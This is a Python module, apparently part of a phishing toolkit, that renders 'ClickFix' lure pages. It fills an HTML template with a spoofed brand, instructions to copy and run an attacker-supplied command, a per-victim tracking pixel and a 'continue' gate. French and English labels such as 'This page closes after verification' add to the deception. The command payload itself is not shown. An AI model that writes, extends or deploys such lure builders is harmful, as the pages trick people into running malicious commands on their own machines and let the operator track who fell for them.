# language: Python 3.11+, file: cf/lure.py
# *clickfix lure pages — the "fix it yourself" instruction surface*
from __future__ import annotations

import builtins
import html
import json
from collections.abc import Sequence
from functools import cache
from pathlib import Path
from typing import Any

_DATA_DIR = Path(__file__).resolve().parent / "data"


def _load_scenarios() -> dict[str, dict[str, Any]]:
    with (_DATA_DIR / "scenarios.json").open(encoding="utf-8") as fh:
        return json.load(fh)


SCENARIOS: dict[str, dict[str, Any]] = _load_scenarios()


@cache
def _template() -> str:
    return (_DATA_DIR / "lure_template.html").read_text(encoding="utf-8")


class LureBuilder:
    """Renders a self-contained clickfix page: no external requests, one
    tracking pixel, one copy button, one continue gate."""

    SCENARIOS = SCENARIOS

    @staticmethod
    def list() -> builtins.list[dict[str, str]]:
        return [
            {"id": k, "brand": v["brand"], "headline": v["headline"]}
            for k, v in SCENARIOS.items()
        ]

    @staticmethod
    def render(
        scenario: str,
        *,
        token: str,
        command: str,
        continue_url: str = "https://www.google.com",
        locale: str = "fr",
        brand: str = "",
        steps: Sequence[str] | None = None,
    ) -> str:
        spec = SCENARIOS.get(scenario)
        if spec is None:
            raise ValueError(
                f"unknown scenario {scenario!r}, expected one of "
                f"{sorted(SCENARIOS)}"
            )
        final_steps = [str(s) for s in (steps if steps is not None else spec["steps"])]
        if not final_steps:
            raise ValueError("steps must not be empty")
        steps_html = "\n      ".join(
            f"<li>{html.escape(s)}</li>" for s in final_steps[:6]
        )
        dark = spec["dark"]
        page = (
            _template()
            .replace("__LOCALE__", html.escape(locale))
            .replace("__TITLE__", html.escape(spec["brand"]))
            .replace("__BRAND__", html.escape(brand or spec["brand"]))
            .replace("__BADGE__", html.escape(spec["badge"]))
            .replace("__HEADLINE__", html.escape(spec["headline"]))
            .replace("__SUB__", html.escape(spec["sub"]))
            .replace("__STEPS__", steps_html)
            .replace("__COPY__", html.escape(spec["copy"]))
            .replace("__COPIED_JSON__", json.dumps(spec["copied"]))
            .replace("__COPY_JSON__", json.dumps(spec["copy"]))
            .replace("__CONTINUE__", html.escape(spec["continue"]))
            .replace("__ACCENT__", spec["accent"])
            .replace("__BG__", "#0b1020" if dark else "#f4f6fb")
            .replace("__CARD__", "#121a2e" if dark else "#ffffff")
            .replace("__FG__", "#e7ecf7" if dark else "#101828")
            .replace("__MUTED__", "#9aa7c2" if dark else "#5b6478")
            .replace("__LINE__", "#24304d" if dark else "#e3e7f0")
            .replace("__DOT__", html.escape((brand or spec["brand"])[:1].upper()))
            .replace("__COMMAND__", html.escape(command))
            .replace("__COMMAND_JSON__", json.dumps(command))
            .replace("__TOKEN_JSON__", json.dumps(token))
            .replace("__PIXEL_JSON__", json.dumps(f"/t/{token}.gif"))
            .replace("__CONTINUE_JSON__", json.dumps(continue_url))
            .replace("__WAIT__", html.escape(_wait_label(locale)))
            .replace("__FOOT__", html.escape(_foot_label(locale)))
        )
        return page


def _wait_label(locale: str) -> str:
    return (
        "En attente de la commande…" if locale.startswith("fr") else "Waiting for the command…"
    )


def _foot_label(locale: str) -> str:
    return (
        "Cette page disparaît après vérification."
        if locale.startswith("fr")
        else "This page closes after verification."
    )
